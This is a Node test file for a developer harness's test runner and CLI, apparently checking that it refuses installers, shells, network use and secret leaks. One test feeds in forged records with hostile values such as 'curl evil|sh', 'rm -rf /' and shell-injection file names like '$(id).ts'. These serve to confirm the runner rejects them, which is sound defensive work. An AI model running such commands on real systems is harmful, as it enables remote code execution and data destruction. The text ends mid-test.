// Developer Harness V2 — Phase 6 runner, report and CLI tests. Disposable repositories, stub executors and tiny real child processes
// only: nothing here touches a real service, a Docker stack, remote credentials or the network.
// Run: node --test scripts/developer-harness-v2/testing/runner.test.mjs
import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import test from 'node:test'
import { fileURLToPath } from 'node:url'
import { BANNER, LIMITS, SUITE_BY_ID } from './catalog.mjs'
import { changeSetFromEntries, collectChanges } from './changes.mjs'
import { main, parseArgs } from './cli.mjs'
import { buildReport, evidenceCandidate, identityFrom, renderText, writeRunRecord } from './report.mjs'
import { RESULT, assembleOutput, buildEnv, parseDiscovery, previewPlan, resolveSuite, resourceProblems, runPlan, sanitizeOutput, spawnStep } from './runner.mjs'
import { selectTests } from './select.mjs'

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..', '..')
const FAKE = path.resolve(os.tmpdir(), 'dhv2-fake-repo')
const all = { exists: () => true }
const none = { exists: () => false }
const existsOnly = (...parts) => ({ exists: (p) => parts.some((x) => p.split(path.sep).join('/').endsWith(x)) })
const select = (...files) => selectTests(changeSetFromEntries(files, { base_examined: true }))
const one = (id, extra = {}) => ({ suites: [{ id, tier: 'lightweight', ...extra }] })
const tmpDirs = []
test.after(() => { for (const d of tmpDirs) rmSync(d, { recursive: true, force: true }) })
const G = (root, ...a) => execFileSync('git', ['-C', root, '-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...a], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim()
function mkRepo({ ignore = true } = {}) {
  const root = mkdtempSync(path.join(os.tmpdir(), 'dhv2-p6r-')); tmpDirs.push(root)
  G(root, 'init', '-q', '-b', 'main'); if (ignore) writeFileSync(path.join(root, '.gitignore'), '.wolf/runtime-logs/\n')
  mkdirSync(path.join(root, 'apps/web/lib'), { recursive: true }); writeFileSync(path.join(root, 'apps/web/lib/a.ts'), 'a\n')
  G(root, 'add', '-A'); G(root, 'commit', '-q', '-m', 'base'); const base = G(root, 'rev-parse', 'HEAD'); G(root, 'checkout', '-q', '-b', 'task/x')
  return { root, base }
}
const spy = () => { const calls = []; const f = async (spec) => { calls.push(spec); return { status: RESULT.PASSED, exit_code: 0, duration_ms: 1, output: 'ℹ tests 3\nℹ pass 3\n', raw_for_discovery: 'ℹ tests 3\nℹ pass 3\n', output_bytes: 20 } }; f.calls = calls; return f }

test('the preview executes nothing and shows every command with its safety class', () => {
  const executor = spy(); const plan = previewPlan(select('scripts/developer-harness-v2/routing/router.mjs'), { root: FAKE, fsx: all })
  assert.equal(plan.executes_nothing, true); assert.equal(executor.calls.length, 0)
  const w = plan.entries.filter((e) => e.action === 'WILL_RUN'); assert.ok(w.length > 3)
  for (const e of w) { assert.ok(e.commands.length && e.timeout_ms > 0 && e.env_names.includes('PATH')); assert.ok(!e.env_names.some((n) => /SECRET|TOKEN|PASSWORD/.test(n) && !['SUPABASE_JWT_SECRET', 'STRIPE_WEBHOOK_SECRET', 'CRON_SECRET'].includes(n))) }
  assert.ok(plan.entries.every((e) => ['WILL_RUN', 'BLOCKED', 'NOT_RUN', 'DEDUPED'].includes(e.action)))
  assert.ok(plan.entries.filter((e) => e.tier === 'ci_only').every((e) => e.action === 'NOT_RUN' && e.code === 'CI.ONLY'))
})

test('a missing dependency set is REPORTED as blocked — nothing is installed or spawned', async () => {
  const executor = spy(); const plan = previewPlan(select('apps/web/lib/a.ts'), { root: FAKE, fsx: { exists: (p) => !p.includes('node_modules') } })
  for (const id of ['web.lint', 'web.typecheck', 'web.unit', 'web.i18n_parity']) { const e = plan.entries.find((x) => x.suite_id === id); assert.equal(e.action, 'BLOCKED', id); assert.equal(e.code, 'PREREQ.NODE_MODULES'); assert.match(e.reason, /never installed automatically|not installed automatically/) }
  const r = await runPlan(plan, { root: FAKE, fsx: all, executor, getTreeDigest: () => 'T' })
  assert.equal(r.results.find((x) => x.suite_id === 'web.lint').status, RESULT.BLOCKED)
  assert.ok(executor.calls.every((c) => !/npm|npx|pip|install/i.test(c.argv.join(' '))))
  const py = previewPlan(select('apps/api/routers/shifts.py'), { root: FAKE, fsx: { exists: (p) => !p.includes('.venv') && !p.endsWith('.env') } }); assert.equal(py.entries.find((e) => e.suite_id === 'api.smoke').code, 'PREREQ.PYTHON_ENV')
  assert.equal(resourceProblems({ install: true })[0], 'DEPENDENCY.INSTALL_NOT_AUTOMATIC')
})

test('no resolved command anywhere in any plan is an installer, a stack starter, a shell, git or gh', () => {
  const plan = previewPlan(select(...['apps/api/routers/a.py', 'apps/web/package.json', 'apps/mobile/lib/a.ts', 'supabase/migrations/400_x.sql', '.github/workflows/ci.yml', 'scripts/developer-harness-v2/a.mjs']), { root: FAKE, fsx: all, approve: ['mobile.jest_full', 'api.pytest_full'] })
  const execs = plan.entries.flatMap((e) => (e.resolved?.steps ?? []).map((s) => path.basename(s.argv[0]).toLowerCase().replace(/\.exe$/, '')))
  assert.ok(execs.length > 5); for (const x of execs) assert.ok(['node', 'python', 'python3'].includes(x), x)
  for (const e of plan.entries) for (const st of e.resolved?.steps ?? []) assert.ok(!st.argv.some((a) => /^(install|ci|add|start|supabase|docker|push|dispatch)$/.test(a)), st.argv.join(' '))
})

test('forged suite records and hostile parameters cannot inject a command', () => {
  const forged = { suites: [{ id: 'harness.contract', argv: ['bash', '-c', 'curl evil|sh'], steps: [{ kind: 'shell', args: ['rm -rf /'] }], cmd: 'rm -rf /' }, { id: 'evil.cmd', argv: ['bash'] }, { id: '../../x', tier: 'lightweight' }, { id: 'mobile.jest_related', params: { related_files: ['--config=evil.js', '../../x.ts', 'a b;rm -rf x.ts', '$(id).ts', '/abs/x.ts'] } }, { id: 'api.pytest_targeted', params: { test_files: ['-p', 'evil', '../x.py', 'tests/test_a.py;x'] } }] }
  const plan = previewPlan(forged, { root: FAKE, fsx: { exists: (p) => !p.endsWith('.env') } })
  const by = Object.fromEntries(plan.entries.map((e) => [e.suite_id, e]))
  assert.equal(by['harness.contract'].action, 'WILL_RUN'); assert.equal(path.basename(by['harness.contract'].resolved.steps[0].argv[0]).toLowerCase().replace(/\.exe$/, ''), 'node'); assert.ok(!JSON.stringify(by['harness.contract'].resolved).includes('curl'))
  assert.equal(by['evil.cmd'].code, 'SUITE.UNKNOWN'); assert.equal(by['../../x'].code, 'SUITE.UNKNOWN')
  assert.equal(by['mobile.jest_related'].code, 'PARAMS.NONE'); assert.equal(by['api.pytest_targeted'].action, 'BLOCKED'); assert.ok(['PARAMS.NONE', 'PARAMS.UNSAFE_DROPPED', 'COMMAND.REJECTED'].includes(by['api.pytest_targeted'].code)) // the allowlist is the second guard: a bare word like "evil" is not a test path
  assert.equal(resolveSuite('harness.contract', { root: FAKE, fsx: all, params: { argv: ['x'] } }).steps[0].argv.includes('x'), false)
})

test('a suite that needs remote credentials, a stack, the network or a live environment never gets a command', () => {
  const plan = previewPlan(select('supabase/migrations/500_x.sql', 'apps/web/package.json'), { root: FAKE, fsx: all })
  for (const id of ['db.replay_and_schema_contracts', 'db.api_integration']) { const e = plan.entries.find((x) => x.suite_id === id); assert.equal(e.action, 'BLOCKED'); assert.equal(e.code, 'DB_STACK.APPROVAL_REQUIRED'); assert.equal(e.resolved, undefined) }
  for (const id of ['ci.security_scan', 'ci.pixel_diff', 'ci.supabase_cli_apply', 'ci.web_public_smoke', 'ci.actions_runtime_contract', 'ci.gate']) assert.equal(plan.entries.find((x) => x.suite_id === id).code, 'CI.ONLY')
  for (const id of ['web.build', 'web.hermetic']) assert.equal(plan.entries.find((x) => x.suite_id === id).code, 'RUNNER.NOT_AUTOMATED')
  // a local apps/api/.env can point at production: API suites refuse to run while it exists, and it is never read
  const withEnv = previewPlan(select('apps/api/routers/a.py'), { root: FAKE, fsx: { exists: (p) => true } }).entries.find((e) => e.suite_id === 'api.smoke')
  assert.equal(withEnv.code, 'ENV.LOCAL_DOTENV_PRESENT')
})

test('Jest never exceeds two workers, in the resolved command or in the request', () => {
  const plan = previewPlan(select('apps/mobile/lib/a.ts'), { root: FAKE, fsx: all, approve: ['mobile.jest_full'] })
  for (const id of ['mobile.jest_full', 'mobile.jest_related']) {
    const argv = plan.entries.find((e) => e.suite_id === id).resolved?.steps[0].argv ?? (id === 'mobile.jest_related' ? resolveSuite(id, { root: FAKE, fsx: all, params: { related_files: ['lib/a.ts'] } }).steps[0].argv : null)
    assert.equal(argv.filter((a) => a.startsWith('--maxWorkers')).length, 1); assert.ok(argv.includes('--maxWorkers=2') && argv.includes('--ci')); assert.ok(!argv.some((a) => /^(-w|--workers|--runInBand|--watch|-u)$/.test(a)))
  }
  assert.deepEqual(resourceProblems({ jestWorkers: 3 }), ['JEST.WORKERS_OVER_LIMIT']); assert.deepEqual(resourceProblems({ jestWorkers: 2 }), []); assert.equal(LIMITS.jestMaxWorkers, 2)
})

test('more than one local database stack, an unapproved stack, and any Docker/Supabase start are rejected before anything runs', async () => {
  assert.ok(resourceProblems({ stacks: ['a', 'b'] }).includes('STACK.TOO_MANY')); assert.ok(resourceProblems({ stacks: ['a'] }).includes('STACK.UNAPPROVED')); assert.deepEqual(resourceProblems({ stacks: ['a'], stackApproval: 'ref' }), [])
  for (const o of [{ startStack: true }, { docker: true }]) assert.ok(resourceProblems(o).includes('STACK.START_NOT_SUPPORTED'))
  assert.ok(resourceProblems({ concurrency: 4 }).includes('CONCURRENCY.OVER_LIMIT')); assert.equal(LIMITS.defaultAutoDbStacks, 0)
  const executor = spy(); const plan = previewPlan(one('harness.contract'), { root: FAKE, fsx: all, request: { stacks: ['x', 'y'], startStack: true } })
  const r = await runPlan(plan, { root: FAKE, fsx: all, executor }); assert.equal(executor.calls.length, 0); assert.equal(r.stopped, 'REQUEST_REJECTED'); assert.ok(r.results.every((x) => x.status === RESULT.NOT_RUN))
})

test('execution is strictly sequential, lightweight first, and each suite runs once', async () => {
  let live = 0; let max = 0; const order = []
  const executor = async (spec) => { live++; max = Math.max(max, live); order.push(spec.argv.slice(1).find((a) => a.endsWith('.mjs')) ?? 'x'); await new Promise((r) => setTimeout(r, 15)); live--; return { status: RESULT.PASSED, exit_code: 0, duration_ms: 1, output: 'ℹ tests 2\nℹ pass 2\nTests: 2 passed, 2 total\n', output_bytes: 8 } }
  const sel = { suites: [{ id: 'mobile.jest_full', tier: 'expensive' }, { id: 'harness.contract', tier: 'lightweight' }, { id: 'harness.contract', tier: 'lightweight' }, { id: 'harness.routing', tier: 'lightweight' }, { id: 'web.feature_flag_scripts', tier: 'prereq' }] }
  const plan = previewPlan(sel, { root: FAKE, fsx: all, approve: ['mobile.jest_full'] })
  assert.equal(plan.entries.filter((e) => e.suite_id === 'harness.contract').map((e) => e.action).sort().join(), 'DEDUPED,WILL_RUN')
  assert.equal(plan.entries.at(-1).suite_id, 'mobile.jest_full', 'expensive suites run last')
  const r = await runPlan(plan, { root: FAKE, fsx: all, approve: ['mobile.jest_full'], executor, getTreeDigest: () => 'T', parentEnv: {} }); assert.equal(max, 1); assert.equal(order.length, 4)
  assert.ok(r.results.some((x) => x.status === RESULT.DEDUPED)); assert.equal(r.results.filter((x) => x.status === RESULT.PASSED).length, 4)
})

test('expensive suites need explicit per-suite approval', () => {
  const sel = select('apps/mobile/lib/a.ts'); const e = (approve) => previewPlan(sel, { root: FAKE, fsx: all, approve }).entries.find((x) => x.suite_id === 'mobile.jest_full')
  assert.equal(e([]).action, 'NOT_RUN'); assert.equal(e([]).code, 'APPROVAL.REQUIRED'); assert.equal(e(['api.pytest_full']).action, 'NOT_RUN'); assert.equal(e(['mobile.jest_full']).action, 'WILL_RUN')
})

test('a selected suite whose test file is missing stays visible as BLOCKED, not silently dropped', () => {
  const plan = previewPlan(one('harness.contract'), { root: FAKE, fsx: { exists: (p) => !p.endsWith('contract.test.mjs') } })
  assert.equal(plan.entries[0].action, 'BLOCKED'); assert.equal(plan.entries[0].code, 'PREREQ.TEST_FILE_MISSING')
})

test('the child environment holds no credential from the parent; API suites get only fixed placeholders', () => {
  const parent = { PATH: '/bin', SYSTEMROOT: 'C:\\Windows', SUPABASE_SERVICE_ROLE_KEY: 'REAL-service-role-key-123456', GITHUB_TOKEN: 'ghp_REALTOKENvalue0123456789abcd', ANTHROPIC_API_KEY: 'sk-ant-REALKEYVALUE-0123456789', STRIPE_SECRET_KEY: 'sk_live_REALKEY0123456789abc', DATABASE_URL: 'postgres://u:p@prod/db', HOME: '/h' }
  for (const profile of ['node', 'api_test']) {
    const { env, leaked } = buildEnv(profile, parent); assert.deepEqual(leaked, []); const blob = JSON.stringify(env)
    for (const real of ['REAL-service-role-key', 'ghp_REAL', 'sk-ant-REAL', 'sk_live_REAL', 'postgres://u:p@prod']) assert.ok(!blob.includes(real), `${profile} leaked ${real}`)
    assert.equal(env.PATH, '/bin'); assert.ok(!('DATABASE_URL' in env) && !('GITHUB_TOKEN' in env))
  }
  assert.equal(buildEnv('api_test', parent).env.SUPABASE_SERVICE_ROLE_KEY, 'test-key'); assert.equal(buildEnv('api_test', parent).env.SUPABASE_URL, 'https://test.supabase.co'); assert.equal(buildEnv('node', parent).env.SUPABASE_URL, undefined)
})

test('output is scrubbed of secrets, stripped of control characters and bounded', () => {
  const parent = { SUPABASE_SERVICE_ROLE_KEY: 'REAL-service-role-key-123456', HOME: '/h' }
  const t = sanitizeOutput(['key REAL-service-role-key-123456', 'SUPABASE_SERVICE_ROLE_KEY=abcdefghijk', 'postgres://user:pw@host/db', 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.sig', 'sk_live_abcdefghijklmnop0123', 'Authorization: Bearer abc.def.ghi', 'ghp_abcdefghijklmnopqrstuvwx', '-----BEGIN PRIVATE KEY-----\nMIIB\n-----END PRIVATE KEY-----', 'ok\u0000\u0007line'].join('\n'), parent)
  for (const secret of ['REAL-service-role-key', 'abcdefghijk', 'user:pw', 'eyJhbGci', 'sk_live_abc', 'abc.def.ghi', 'ghp_abcdef', 'MIIB']) assert.ok(!t.includes(secret), secret)
  assert.ok(t.includes('okline') && !/[\u0000\u0007]/.test(t))
  const big = sanitizeOutput('x'.repeat(2_000_000), {}); assert.ok(Buffer.byteLength(big) <= LIMITS.maxOutputBytes + 200); assert.match(big, /output truncated/)
})

test('a failing test is never turned into a pass; zero discovered tests is a failure; exit codes are kept', async () => {
  const mk = (exit, out) => async () => ({ status: exit === 0 ? RESULT.PASSED : RESULT.FAILED, exit_code: exit, duration_ms: 1, output: out, raw_for_discovery: out, output_bytes: out.length })
  const run = async (executor) => (await runPlan(previewPlan(one('harness.contract'), { root: FAKE, fsx: all }), { root: FAKE, fsx: all, executor, getTreeDigest: () => 'T', parentEnv: {} })).results[0]
  const failed = await run(mk(1, 'ℹ tests 5\nℹ pass 4\nℹ fail 1\n')); assert.equal(failed.status, RESULT.FAILED); assert.equal(failed.steps[0].exit_code, 1)
  assert.equal((await run(mk(0, 'ℹ tests 0\nℹ pass 0\n'))).status, RESULT.NO_TESTS)
  assert.equal((await run(mk(0, 'nothing recognisable'))).status, RESULT.NO_TESTS)
  const ok = await run(mk(0, 'ℹ tests 7\nℹ pass 7\n')); assert.equal(ok.status, RESULT.PASSED); assert.equal(ok.steps[0].tests_discovered, 7)
  assert.equal(parseDiscovery('pytest', '== no tests ran in 0.1s =='), 0); assert.equal(parseDiscovery('pytest', '12 passed, 1 warning in 3s'), 12); assert.equal(parseDiscovery('jest', 'Tests:       2 failed, 10 passed, 12 total'), 10); assert.equal(parseDiscovery('node_test', 'junk'), null)
})

test('a multi-step suite stops at the first non-passing step and keeps the rest visible as NOT_RUN', async () => {
  let n = 0; const executor = async () => { n++; return n === 1 ? { status: RESULT.FAILED, exit_code: 2, duration_ms: 1, output: 'bad', output_bytes: 3 } : { status: RESULT.PASSED, exit_code: 0, duration_ms: 1, output: '', output_bytes: 0 } }
  const r = (await runPlan(previewPlan(one('repo.feature_flag_registry'), { root: FAKE, fsx: all }), { root: FAKE, fsx: all, executor, getTreeDigest: () => 'T', parentEnv: {} })).results[0]
  assert.equal(r.status, RESULT.FAILED); assert.equal(r.steps[1].status, RESULT.NOT_RUN); assert.equal(n, 1)
})

test('a real child process that hangs is killed at its timeout and reported TIMED_OUT, process tree gone', async () => {
  const child = "const c=require('node:child_process').spawn(process.execPath,['-e','setTimeout(()=>{},60000)']);console.log('PID:'+c.pid);setTimeout(()=>{},60000)"
  const r = await spawnStep({ argv: [process.execPath, '-e', child], cwd: os.tmpdir(), env: buildEnv('node').env, timeout_ms: 1500 })
  assert.equal(r.status, RESULT.TIMED_OUT); assert.notEqual(r.exit_code, 0)
  const grand = Number(/PID:(\d+)/.exec(r.output)?.[1]); assert.ok(grand > 0, 'the grandchild pid must have been captured'); { await new Promise((x) => setTimeout(x, 500)); assert.throws(() => process.kill(grand, 0), 'grandchild process must be gone') }
})

test('interruption keeps completed results, marks the running suite INTERRUPTED and the rest NOT_RUN', async () => {
  const ac = new AbortController(); let n = 0
  const executor = async (spec, { signal }) => { n++; if (n === 1) return { status: RESULT.PASSED, exit_code: 0, duration_ms: 1, output: 'ℹ tests 4\nℹ pass 4\n', output_bytes: 9 }; return spawnStep({ argv: [process.execPath, '-e', 'setTimeout(()=>{},60000)'], cwd: os.tmpdir(), env: buildEnv('node').env, timeout_ms: 60000 }, { signal }) }
  const plan = previewPlan({ suites: ['harness.contract', 'harness.routing', 'harness.policy'].map((id) => ({ id, tier: 'lightweight' })) }, { root: FAKE, fsx: all })
  const p = runPlan(plan, { root: FAKE, fsx: all, executor, signal: ac.signal, getTreeDigest: () => 'T', parentEnv: {} }); setTimeout(() => ac.abort(), 800)
  const r = await p; const s = Object.fromEntries(r.results.map((x) => [x.suite_id, x.status]))
  assert.equal(s['harness.contract'], RESULT.PASSED); assert.equal(s['harness.routing'], RESULT.INTERRUPTED); assert.equal(s['harness.policy'], RESULT.NOT_RUN); assert.equal(r.stopped, 'INTERRUPTED')
})

test('a changed working tree during the run invalidates the evidence and stops the run', async () => {
  let call = 0; const trees = ['A', 'B', 'B', 'B']; const executor = spy()
  const plan = previewPlan({ suites: ['harness.contract', 'harness.routing'].map((id) => ({ id, tier: 'lightweight' })) }, { root: FAKE, fsx: all })
  const r = await runPlan(plan, { root: FAKE, fsx: all, executor, getTreeDigest: () => trees[Math.min(call++, 3)], parentEnv: {} })
  assert.equal(r.results[0].status, RESULT.INVALID); assert.equal(r.results[1].status, RESULT.NOT_RUN); assert.equal(r.stopped, 'TREE_CHANGED'); assert.equal(executor.calls.length, 1)
})

test('END TO END: a real lightweight harness suite runs through the allowlisted path and is discovered, passed and tree-stable', async () => {
  const plan = previewPlan(one('harness.contract'), { root: ROOT })
  assert.equal(plan.entries[0].action, 'WILL_RUN')
  const r = await runPlan(plan, { root: ROOT }); const s = r.results[0]
  assert.equal(s.status, RESULT.PASSED, JSON.stringify(s.steps?.[0] && { ...s.steps[0], output: s.steps[0].output?.slice(-400) })); assert.ok(s.steps[0].tests_discovered > 0); assert.equal(r.tree_digest_start, r.tree_digest_end)
})

const rep = (run, sel = select('apps/web/lib/a.ts'), identity) => buildReport({ selection: sel, plan: null, run, identity: identity ?? { head_sha: 'h'.repeat(40), tree_digest: 'T', changed_file_digest: 'c', task_id: null, branch: 'b', base_sha: null, phase5_scope_digest: null, task_checkpoint: 'not_consulted' } })
const passRun = (sel, tree = 'T') => ({ results: sel.suites.filter((s) => ['RUN', 'RUN_WITH_PREREQS'].includes(s.local_action)).map((s) => ({ suite_id: s.id, status: RESULT.PASSED, steps: [] })).concat(sel.suites.filter((s) => !['RUN', 'RUN_WITH_PREREQS'].includes(s.local_action)).map((s) => ({ suite_id: s.id, status: RESULT.NOT_RUN }))), request_problems: [], tree_digest_start: tree, tree_digest_end: tree, stopped: null })

test('every report is labelled non-authoritative and a preview is never test evidence', () => {
  const sel = select('apps/web/lib/a.ts'); const preview = buildReport({ selection: sel, plan: previewPlan(sel, { root: FAKE, fsx: all }), run: null, identity: { head_sha: 'h', tree_digest: 'T' } })
  assert.equal(preview.banner, BANNER); assert.equal(preview.authoritative, false); assert.equal(preview.ci_equivalent, false); assert.equal(preview.mode, 'PREVIEW')
  assert.deepEqual(preview.evidence, { eligible: false, reasons: ['NOT_EXECUTED'], note: 'a selection or preview is not test evidence' })
  assert.ok(preview.outcomes.every((o) => o.status === RESULT.NOT_RUN)); assert.equal(renderText(preview).split('\n')[0], BANNER); assert.ok(renderText(preview).trimEnd().endsWith(BANNER))
  assert.match(preview.report_digest, /^[0-9a-f]{64}$/); assert.equal(preview.report_digest, buildReport({ selection: sel, plan: previewPlan(sel, { root: FAKE, fsx: all }), run: null, identity: { head_sha: 'h', tree_digest: 'T' }, now: 'later' }).report_digest)
})

test('evidence: a pass candidate needs every locally runnable suite passed on the unchanged tree; a FAIL is always offered', () => {
  const lw = selectTests(changeSetFromEntries(['docs/GUIDE.md'], { base_examined: true })); const lwLocal = { ...lw, suites: lw.suites.filter((s) => s.local_action === 'RUN' || s.local_action === 'CI_ONLY') }
  const good = rep(passRun(lwLocal), lwLocal); assert.equal(good.evidence.eligible, true); assert.equal(good.evidence.result, 'pass'); assert.deepEqual(good.evidence.bound, { head_sha: 'h'.repeat(40), tree_digest: 'T' }); assert.equal(good.evidence.by, 'test_coordinator')
  const failing = passRun(lwLocal); failing.results[0].status = RESULT.FAILED; const f = rep(failing, lwLocal); assert.equal(f.evidence.result, 'fail'); assert.ok(f.evidence.failing.length === 1)
  for (const bad of [RESULT.TIMED_OUT, RESULT.INTERRUPTED, RESULT.NO_TESTS, RESULT.INVALID]) { const r = passRun(lwLocal); r.results[0].status = bad; assert.equal(rep(r, lwLocal).evidence.result, 'fail', bad) }
  const missing = passRun(lwLocal); missing.results.shift(); assert.equal(rep(missing, lwLocal).evidence.eligible, false)
  const moved = passRun(lwLocal); moved.tree_digest_end = 'OTHER'; assert.ok(rep(moved, lwLocal).evidence.reasons.includes('TREE_CHANGED_OR_UNPROVEN'))
  const blocked = passRun(lwLocal); blocked.results[0].status = RESULT.BLOCKED; assert.equal(rep(blocked, lwLocal).evidence.eligible, false)
  const unproven = selectTests(changeSetFromEntries(['mystery/x.bin'], { base_examined: true })); assert.ok(rep(passRun({ ...unproven, suites: unproven.suites.filter((s) => s.local_action === 'RUN') }), unproven).evidence.eligible === false)
  assert.equal(rep({ ...passRun(lwLocal), results: [] }, lwLocal).evidence.eligible, false)
})

test('task identity is read-only and mismatches are reported', () => {
  const change = { head_sha: 'h', branch: 'task/x', base_sha: 'b'.repeat(40), tree_digest: 'T', changed_file_digest: 'c' }
  assert.deepEqual(identityFrom(change, { taskId: 't1', taskRecord: { task_id: 't1', repo: { base_sha: 'b'.repeat(40), branch: 'task/x' } } }).problems, [])
  assert.deepEqual(identityFrom(change, { taskId: 't1', taskRecord: { task_id: 'other', repo: { base_sha: 'c'.repeat(40), branch: 'main' } } }).problems.sort(), ['TASK.BASE_MISMATCH', 'TASK.BRANCH_MISMATCH', 'TASK.ID_MISMATCH'])
  assert.equal(identityFrom(change).identity.task_checkpoint, 'not_consulted')
})

test('run records are written only under the git-ignored store, atomically, and refuse unsafe targets', () => {
  const sel = select('apps/web/lib/a.ts'); const report = rep(null, sel)
  const { root } = mkRepo(); const w = writeRunRecord(root, report); assert.equal(w.ok, true); assert.match(w.file.split(path.sep).join('/'), /\.wolf\/runtime-logs\/developer-harness-v2\/testing\/\d{14}-[0-9a-f]{8}\.json$/); assert.equal(JSON.parse(readFileSync(w.file, 'utf8')).banner, BANNER)
  assert.equal(writeRunRecord(root, report, '../../evil').code, 'RUN_STORE.BAD_ID')
  assert.equal(writeRunRecord(mkRepo({ ignore: false }).root, report).code, 'RUN_STORE.NOT_GIT_IGNORED')
  const { root: r2 } = mkRepo(); mkdirSync(path.join(r2, '.wolf'), { recursive: true }); const outside = mkdtempSync(path.join(os.tmpdir(), 'dhv2-p6r-out-')); tmpDirs.push(outside)
  try { symlinkSync(outside, path.join(r2, '.wolf', 'runtime-logs'), 'junction'); assert.equal(writeRunRecord(r2, report).code, 'RUN_STORE.NOT_A_REAL_DIRECTORY') } catch (e) { if (e.code === 'ERR_ASSERTION') throw e }
})

test('CLI: strict option parsing and a preview-by-default command line', async () => {
  for (const bad of [[], ['bogus'], ['plan', '--nope', 'x'], ['plan', '--base'], ['plan', 'stray'], ['plan', '--format', 'xml'], ['plan', '--approve', 'not.a.suite'], ['run', '--approve', 'x; rm']]) assert.throws(() => parseArgs(bad), undefined, JSON.stringify(bad))
  assert.equal((await main(['bogus'])).code, 2)
  const { root, base } = mkRepo(); writeFileSync(path.join(root, 'apps/web/lib/new.ts'), 'n\n')
  const plan = await main(['plan', '--base', base, '--root', root]); assert.equal(plan.code, 0); assert.equal(plan.out.split('\n')[0], BANNER); assert.match(plan.out, /Mode: PREVIEW/); assert.match(plan.out, /web\.lint/)
  const run = await main(['run', '--base', base, '--root', root, '--format', 'text']); assert.match(run.out, /Preview only/); assert.match(run.out, /Mode: PREVIEW/)
  const json = JSON.parse((await main(['plan', '--base', base, '--root', root, '--format', 'json'])).out); assert.equal(json.authoritative, false); assert.equal(json.banner, BANNER); assert.ok(json.checklist.items.some((i) => i.id === 'CI.AUTHORITATIVE_GATES'))
  const bad = await main(['plan', '--base', '--evil', '--root', root]); assert.equal(bad.code, 2)
  const unresolved = await main(['plan', '--base', 'no-such-ref', '--root', root]); assert.match(unresolved.out, /COVERAGE\.UNPROVEN/)
})

test('CLI: --execute runs only what resolves; in a repository without the suites everything stays BLOCKED, nothing passes', async () => {
  const { root, base } = mkRepo(); writeFileSync(path.join(root, 'apps/web/lib/new.ts'), 'n\n')
  const r = await main(['run', '--base', base, '--root', root, '--execute', '--format', 'json'], { write: true }); const rep2 = JSON.parse(r.out)
  assert.equal(rep2.mode, 'EXECUTED'); assert.equal(rep2.summary.passed.length, 0); assert.ok(rep2.summary.blocked.length > 0); assert.equal(rep2.evidence.eligible, false)
  assert.equal(r.code, 3, 'nothing ran: the exit status must say incomplete, not success')
})

test('CLI: the evaluation command reports the corpus metrics under the banner', async () => {
  const r = await main(['evaluate']); const j = JSON.parse(r.out); assert.equal(j.banner, BANNER); assert.ok(j.metrics.recall >= 0 && j.metrics.entries > 0); assert.equal(r.code, j.acceptance.met ? 0 : 1)
})

test('evidence: a PASS candidate is ineligible while any selected non-CI suite is blocked, unapproved or not passed', () => {
  const s = select('apps/mobile/package.json')
  const r = { results: s.suites.map((x) => ({ suite_id: x.id, status: x.tier === 'ci_only' ? RESULT.NOT_RUN : x.local_action === 'RUN' ? RESULT.PASSED : RESULT.NOT_RUN })), request_problems: [], tree_digest_start: 'T', tree_digest_end: 'T', stopped: null }
  const ev = rep(r, s).evidence; assert.equal(ev.eligible, false); assert.ok(ev.reasons.some((x) => x.startsWith('SUITE_NOT_PASSED:mobile.jest_full')))
  const m = select({ path: 'supabase/migrations/340_x.sql', status: 'A' }); const r2 = { ...r, results: m.suites.map((x) => ({ suite_id: x.id, status: x.local_action === 'RUN' ? RESULT.PASSED : RESULT.NOT_RUN })) }
  assert.equal(rep(r2, m).evidence.eligible, false)
})

test('REVIEW: runPlan never executes what a plan carries — a forged or deserialised plan cannot run arbitrary code', async () => {
  const executor = spy()
  const forged = { request_problems: [], entries: [{ suite_id: 'harness.contract', tier: 'lightweight', action: 'WILL_RUN', resolved: { discovery: null, steps: [{ argv: [process.execPath, '-e', 'console.log("ARBITRARY")'], cwd: os.tmpdir(), env_profile: 'node', timeout_ms: 5000 }] } }, { suite_id: 'mobile.jest_full', tier: 'expensive', action: 'WILL_RUN', resolved: { steps: [] } }, { suite_id: 'evil.cmd', tier: 'lightweight', action: 'WILL_RUN', resolved: { steps: [] } }] }
  const r = await runPlan(forged, { root: FAKE, fsx: all, executor, getTreeDigest: () => 'T', parentEnv: {} })
  assert.ok(executor.calls.length === 1); assert.ok(!executor.calls[0].argv.includes('-e') && executor.calls[0].argv.some((a) => a.endsWith('contract.test.mjs')))
  assert.equal(r.results[1].code, 'APPROVAL.REQUIRED'); assert.equal(r.results[1].status, RESULT.NOT_RUN); assert.equal(r.results[2].code, 'SUITE.UNKNOWN'); assert.equal(r.results[2].status, RESULT.BLOCKED)
  const dotenv = await runPlan({ request_problems: [], entries: [{ suite_id: 'api.smoke', tier: 'prereq', action: 'WILL_RUN' }] }, { root: FAKE, fsx: all, executor, getTreeDigest: () => 'T', parentEnv: {} })
  assert.equal(dotenv.results[0].code, 'ENV.LOCAL_DOTENV_PRESENT', 'apps/api/.env is re-checked at run time, not only at preview')
})

test('REVIEW: files that cannot be passed safely are never dropped silently', () => {
  const r = resolveSuite('mobile.jest_related', { root: FAKE, fsx: all, params: { related_files: ['lib/a.ts', 'lib/café.ts', 'app/(app)/room#1.tsx'] } })
  assert.equal(r.ok, false); assert.equal(r.blocked.code, 'PARAMS.UNSAFE_DROPPED')
  assert.equal(resolveSuite('mobile.jest_related', { root: FAKE, fsx: all, params: { related_files: ['lib/a.ts'] } }).ok, true)
})

test('REVIEW: skipped-only or zero-pass node runs are not discovery; the LAST pass line wins; a registry test step with no tests fails', async () => {
  assert.equal(parseDiscovery('node_test', 'ℹ tests 5\nℹ pass 0\nℹ skipped 5'), 0); assert.equal(parseDiscovery('node_test', '# tests 9\n# pass 9\nℹ tests 0\nℹ pass 0'), 0); assert.equal(parseDiscovery('node_test', 'ℹ tests 3\nℹ pass 3'), 3)
  let n = 0; const executor = async () => { n++; return { status: RESULT.PASSED, exit_code: 0, duration_ms: 1, output: n === 1 ? '' : 'ℹ tests 0\nℹ pass 0\n', output_bytes: 1 } }
